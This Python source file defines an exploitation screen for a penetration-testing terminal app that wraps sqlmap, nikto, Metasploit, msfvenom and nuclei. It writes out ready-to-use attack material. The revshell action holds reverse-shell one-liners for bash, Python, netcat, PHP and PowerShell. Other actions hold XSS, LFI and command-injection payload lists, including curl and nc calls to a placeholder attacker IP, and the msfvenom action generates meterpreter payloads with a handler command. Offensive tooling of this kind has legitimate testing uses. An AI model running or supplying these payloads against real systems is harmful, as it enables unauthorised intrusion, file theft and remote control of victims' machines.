"""Exploitation screen for vulnerability testing."""

import asyncio
import shutil
from textual.app import ComposeResult
from textual.containers import Container, Vertical, Horizontal, ScrollableContainer
from textual.screen import Screen
from textual.widgets import Static, Button, Input, DataTable, ListView, ListItem, Label, Select, TextArea
from textual.binding import Binding

from voidwave.core.logging import get_logger
from voidwave.tui.widgets.tool_output import ToolOutput
from voidwave.tui.helpers.preflight_runner import PreflightRunner

logger = get_logger(__name__)


class ExploitScreen(Screen):
    """Vulnerability exploitation module."""

    CSS = """
    ExploitScreen {
        layout: grid;
        grid-size: 2 2;
        grid-rows: 1fr 1fr;
        grid-columns: 1fr 2fr;
    }

    #menu-panel {
        row-span: 2;
        border: solid $success;
        padding: 1;
    }

    #content-panel {
        border: solid $primary;
        padding: 1;
    }

    #output-panel {
        border: solid $warning;
        padding: 1;
    }

    .panel-title {
        text-style: bold;
        margin-bottom: 1;
    }

    .action-item {
        padding: 0 1;
    }

    .action-item:hover {
        background: $secondary;
    }

    .result-table {
        height: 100%;
    }

    #payload-area {
        height: 10;
    }
    """

    BINDINGS = [
        Binding("escape", "app.pop_screen", "Back"),
        Binding("r", "refresh", "Refresh"),
    ]

    MENU_ITEMS = [
        ("searchsploit", "Searchsploit", "searchsploit"),
        ("sqlmap", "SQLmap", "sqlmap"),
        ("nikto", "Nikto Vuln", "nikto"),
        ("msfconsole", "Metasploit", "msfconsole"),
        ("msfvenom", "MSFvenom Payload", "msfvenom"),
        ("revshell", "Reverse Shell", "revshell"),
        ("xsstrike", "XSS Test", "xsstrike"),
        ("lfi", "LFI Test", "lfi_test"),
        ("cmdi", "Command Injection", "cmdi_test"),
        ("nuclei-exp", "Nuclei Exploits", "nuclei_exploits"),
    ]

    def __init__(self) -> None:
        super().__init__()
        self.current_target: str = ""
        self._preflight: PreflightRunner | None = None

    def compose(self) -> ComposeResult:
        """Compose the exploit screen layout."""
        with Vertical(id="menu-panel"):
            yield Static("[bold magenta]EXPLOIT[/]", classes="panel-title")
            yield Static("Target:", classes="label")
            yield Input(placeholder="IP, URL, or service", id="target-input")
            yield Static("─" * 20)
            yield Static("Payload Type:", classes="label")
            yield Select(
                [
                    ("windows/meterpreter/reverse_tcp", "win-meterpreter"),
                    ("linux/x64/shell_reverse_tcp", "linux-shell"),
                    ("php/reverse_php", "php-shell"),
                    ("python/shell_reverse_tcp", "python-shell"),
                ],
                id="payload-select",
                value="win-meterpreter",
            )
            yield Static("─" * 20)
            yield Static("Actions:", classes="panel-title")
            with ListView(id="action-list"):
                for item_id, label, _ in self.MENU_ITEMS:
                    yield ListItem(Label(label), id=item_id, classes="action-item")

        with ScrollableContainer(id="content-panel"):
            yield Static("[bold cyan]Results / Payload[/]", classes="panel-title")
            yield DataTable(id="results-table", classes="result-table")
            yield TextArea(id="payload-area", read_only=True)

        with Vertical(id="output-panel"):
            yield Static("[bold yellow]Output[/]", classes="panel-title")
            yield ToolOutput(id="tool-output")

    def on_mount(self) -> None:
        """Initialize the results table."""
        self._preflight = PreflightRunner(self.app)
        table = self.query_one("#results-table", DataTable)
        table.add_columns("Type", "Exploit/Finding", "Details")

    def on_list_view_selected(self, event: ListView.Selected) -> None:
        """Handle menu selection."""
        item_id = event.item.id
        for menu_id, _, action_name in self.MENU_ITEMS:
            if menu_id == item_id:
                action_method = getattr(self, f"action_{action_name}", None)
                if action_method:
                    self.run_worker(action_method(), exclusive=True)
                break

    def _get_target(self) -> str:
        """Get the current target."""
        input_widget = self.query_one("#target-input", Input)
        return input_widget.value.strip()

    def _get_payload(self) -> str:
        """Get the selected payload type."""
        select = self.query_one("#payload-select", Select)
        return str(select.value)

    def _write_output(self, message: str, level: str = "info") -> None:
        """Write to output panel."""
        output = self.query_one("#tool-output", ToolOutput)
        if level == "success":
            output.write_line(f"[green]{message}[/]")
        elif level == "error":
            output.write_line(f"[red]{message}[/]")
        elif level == "warning":
            output.write_line(f"[yellow]{message}[/]")
        else:
            output.write_line(message)

    def _add_result(self, result_type: str, exploit: str, details: str = "") -> None:
        """Add a result to the table."""
        table = self.query_one("#results-table", DataTable)
        table.add_row(result_type, exploit[:60], details[:30])

    def _set_payload_text(self, text: str) -> None:
        """Set the payload text area content."""
        payload_area = self.query_one("#payload-area", TextArea)
        payload_area.load_text(text)

    async def _run_tool(self, tool: str, need_target: bool = True) -> str | None:
        """Run preflight checks for a tool and return target if needed."""
        if not self._preflight:
            return None
        ctx = await self._preflight.prepare_tool(tool)
        if not ctx.ready:
            self._write_output(ctx.error or f"{tool} not available", "error")
            return None
        if ctx.used_fallback and ctx.fallback_tool:
            self._write_output(f"Using {ctx.fallback_tool} instead of {tool}", "warning")
        if need_target:
            target = self._get_target()
            if not target:
                target = await self._preflight.ensure_target("url")
            return target
        return "ready"

    async def action_searchsploit(self) -> None:
        """Search for exploits using searchsploit."""
        target = await self._run_tool("searchsploit")
        if not target:
            return

        self._write_output(f"Searching exploits for: {target}...")

        proc = await asyncio.create_subprocess_exec(
            "searchsploit", target, "--color=never",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()

        for line in stdout.decode().split("\n"):
            line = line.strip()
            if line and "|" in line and not line.startswith("-"):
                parts = line.split("|")
                if len(parts) >= 2:
                    title = parts[0].strip()
                    path = parts[1].strip()
                    self._add_result("Exploit", title, path)
                    self._write_output(f"{title} -> {path}", "success")

        self._write_output("Search complete", "success")

    async def action_sqlmap(self) -> None:
        """Run SQLmap for SQL injection testing."""
        target = await self._run_tool("sqlmap")
        if not target:
            return

        self._write_output(f"Running SQLmap on {target}...")
        self._write_output("This may take a while...", "warning")

        try:
            from voidwave.tools.sqlmap import SqlmapTool

            tool = SqlmapTool()
            await tool.initialize()

            result = await tool.execute(target, {
                "batch": True,
                "level": 2,
                "risk": 1,
            })
        except Exception as e:
            logger.error(f"SQLmap error: {e}")
            self._write_output(f"SQLmap error: {e}", "error")
            return

        if result.success:
            data = result.data
            # Display vulnerabilities found
            for param in data.get("vulnerable_parameters", []):
                param_name = param.get("parameter", "")
                sqli_type = param.get("type", "")
                self._add_result("SQLi", f"{param_name}: {sqli_type}", "sqlmap")
                self._write_output(f"[+] Vulnerable: {param_name} ({sqli_type})", "success")

            # Display extracted data if any
            for db in data.get("databases", []):
                self._add_result("DB", db, "sqlmap")
                self._write_output(f"Database: {db}", "success")

            summary = data.get("summary", {})
            if summary.get("vulnerable"):
                self._write_output(
                    f"SQLmap complete: Target is VULNERABLE",
                    "success",
                )
            else:
                self._write_output("SQLmap complete: No vulnerabilities found", "warning")
        else:
            self._write_output(f"SQLmap failed: {result.errors}", "error")

    async def action_nikto(self) -> None:
        """Run Nikto vulnerability scan."""
        target = await self._run_tool("nikto")
        if not target:
            return

        self._write_output(f"Running Nikto on {target}...")

        try:
            from voidwave.tools.nikto import NiktoTool

            tool = NiktoTool()
            await tool.initialize()

            result = await tool.execute(target, {"tuning": "12b"})
        except Exception as e:
            logger.error(f"Nikto scan error: {e}")
            self._write_output(f"Nikto error: {e}", "error")
            return

        if result.success:
            data = result.data
            for vuln in data.get("vulnerabilities", []):
                desc = vuln.get("description", vuln.get("message", ""))
                osvdb = vuln.get("osvdb", "")
                self._add_result("Vuln", desc, f"OSVDB-{osvdb}" if osvdb else "nikto")
                self._write_output(f"[VULN] {desc}", "warning")

            summary = data.get("summary", {})
            self._write_output(
                f"Nikto complete: {summary.get('total_vulnerabilities', 0)} vulns found",
                "success",
            )
        else:
            self._write_output(f"Nikto failed: {result.errors}", "error")

    async def action_msfconsole(self) -> None:
        """Launch Metasploit console."""
        result = await self._run_tool("msfconsole", need_target=False)
        if not result:
            return

        self._write_output("Launching Metasploit console...")
        self._write_output("This will open in a new terminal", "warning")

        # Try to open in a new terminal
        terminals = ["gnome-terminal", "konsole", "xterm", "xfce4-terminal"]
        for term in terminals:
            if shutil.which(term):
                await asyncio.create_subprocess_exec(
                    term, "-e", "msfconsole",
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                break
        else:
            self._write_output("Could not find terminal emulator", "error")
            self._write_output("Run 'msfconsole' manually", "warning")

    async def action_msfvenom(self) -> None:
        """Generate payload with msfvenom."""
        result = await self._run_tool("msfvenom", need_target=False)
        if not result:
            return

        payload = self._get_payload()
        target = self._get_target()  # Used as LHOST

        if not target:
            target = await self._preflight.ensure_target("ip") if self._preflight else None
            if not target:
                return

        self._write_output(f"Generating payload: {payload}...")

        # Determine format based on payload
        if "windows" in payload:
            fmt = "exe"
            ext = ".exe"
        elif "linux" in payload:
            fmt = "elf"
            ext = ".elf"
        elif "php" in payload:
            fmt = "raw"
            ext = ".php"
        else:
            fmt = "raw"
            ext = ".txt"

        proc = await asyncio.create_subprocess_exec(
            "msfvenom", "-p", payload,
            f"LHOST={target}", "LPORT=4444",
            "-f", fmt,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await proc.communicate()

        if proc.returncode == 0:
            output_file = f"/tmp/payload{ext}"
            with open(output_file, "wb") as f:
                f.write(stdout)
            self._write_output(f"Payload saved to: {output_file}", "success")
            self._add_result("Payload", payload, output_file)

            # Show command for handler
            handler_cmd = f"""
# Start handler:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {target}; set LPORT 4444; exploit"
"""
            self._set_payload_text(handler_cmd)
        else:
            self._write_output(f"Error: {stderr.decode()}", "error")

    async def action_revshell(self) -> None:
        """Generate reverse shell one-liners."""
        target = self._get_target()
        if not target:
            if self._preflight:
                target = await self._preflight.ensure_target("ip")
            if not target:
                return

        self._write_output(f"Generating reverse shells for {target}:4444...")

        shells = {
            "Bash": f"bash -i >& /dev/tcp/{target}/4444 0>&1",
            "Python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{target}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'',
            "Netcat": f"nc -e /bin/bash {target} 4444",
            "PHP": f"php -r '$sock=fsockopen(\"{target}\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{target}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }

        all_shells = ""
        for name, cmd in shells.items():
            self._add_result("RevShell", name, "4444")
            all_shells += f"# {name}\n{cmd}\n\n"

        self._set_payload_text(all_shells)
        self._write_output("Reverse shells generated", "success")
        self._write_output(f"Start listener: nc -lvnp 4444", "warning")

    async def action_xsstrike(self) -> None:
        """Test for XSS vulnerabilities."""
        target = self._get_target()
        if not target:
            if self._preflight:
                target = await self._preflight.ensure_target("url")
            if not target:
                return

        if shutil.which("xsstrike"):
            self._write_output(f"Running XSStrike on {target}...")
            proc = await asyncio.create_subprocess_exec(
                "xsstrike", "-u", target, "--skip",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()

            for line in stdout.decode().split("\n"):
                if "XSS" in line or "vulnerable" in line.lower():
                    self._add_result("XSS", line, "xsstrike")
                    self._write_output(line, "warning")
        else:
            # Provide manual XSS payloads
            self._write_output("XSStrike not installed, providing manual payloads...", "warning")
            payloads = [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                "'-alert(1)-'",
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                "javascript:alert('XSS')",
            ]
            for payload in payloads:
                self._add_result("XSS", payload, "manual")
            self._set_payload_text("\n".join(payloads))

        self._write_output("XSS test complete", "success")

    async def action_lfi_test(self) -> None:
        """Test for Local File Inclusion."""
        target = self._get_target()
        if not target:
            if self._preflight:
                target = await self._preflight.ensure_target("url")
            if not target:
                return

        self._write_output(f"Testing LFI on {target}...")

        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "/proc/self/environ",
        ]

        for payload in lfi_payloads:
            test_url = target.replace("FUZZ", payload) if "FUZZ" in target else f"{target}{payload}"
            self._add_result("LFI", payload, "test")

        self._set_payload_text("\n".join(lfi_payloads))
        self._write_output("LFI payloads generated - test manually", "warning")

    async def action_cmdi_test(self) -> None:
        """Test for command injection."""
        target = self._get_target()
        if not target:
            if self._preflight:
                target = await self._preflight.ensure_target("url")
            if not target:
                return

        self._write_output(f"Generating command injection payloads...")

        cmdi_payloads = [
            "; id",
            "| id",
            "|| id",
            "&& id",
            "$(id)",
            "`id`",
            "; sleep 5",
            "| sleep 5",
            "; curl http://YOURIP/",
            "| nc -e /bin/sh YOURIP 4444",
        ]

        for payload in cmdi_payloads:
            self._add_result("CMDi", payload, "test")

        self._set_payload_text("\n".join(cmdi_payloads))
        self._write_output("Command injection payloads generated", "success")

    async def action_nuclei_exploits(self) -> None:
        """Run Nuclei with exploit templates."""
        target = await self._run_tool("nuclei")
        if not target:
            return

        self._write_output(f"Running Nuclei exploits on {target}...")

        try:
            from voidwave.tools.nuclei import NucleiTool

            tool = NucleiTool()
            await tool.initialize()

            result = await tool.execute(target, {
                "tags": ["cve"],
                "severity": ["medium", "high", "critical"],
            })
        except Exception as e:
            logger.error(f"Nuclei exploit scan error: {e}")
            self._write_output(f"Nuclei error: {e}", "error")
            return

        if result.success:
            data = result.data
            level_map = {"critical": "error", "high": "error", "medium": "warning"}

            for finding in data.get("findings", []):
                template_id = finding.get("template_id", "")
                template_name = finding.get("template_name", "")
                severity = finding.get("severity", "info").lower()
                matched_at = finding.get("matched_at", "")

                level = level_map.get(severity, "info")
                self._add_result("CVE", template_id, f"[{severity}] {matched_at}")
                self._write_output(f"[{severity.upper()}] {template_name}: {matched_at}", level)

            summary = data.get("summary", {})
            self._write_output(
                f"Nuclei exploits complete: {summary.get('total_findings', 0)} CVEs found "
                f"(C:{summary.get('critical', 0)} H:{summary.get('high', 0)} M:{summary.get('medium', 0)})",
                "success",
            )
        else:
            self._write_output(f"Nuclei failed: {result.errors}", "error")

    def action_refresh(self) -> None:
        """Clear results and refresh."""
        table = self.query_one("#results-table", DataTable)
        table.clear()
        output = self.query_one("#tool-output", ToolOutput)
        output.clear()
        self._set_payload_text("")
        self.notify("Results cleared")
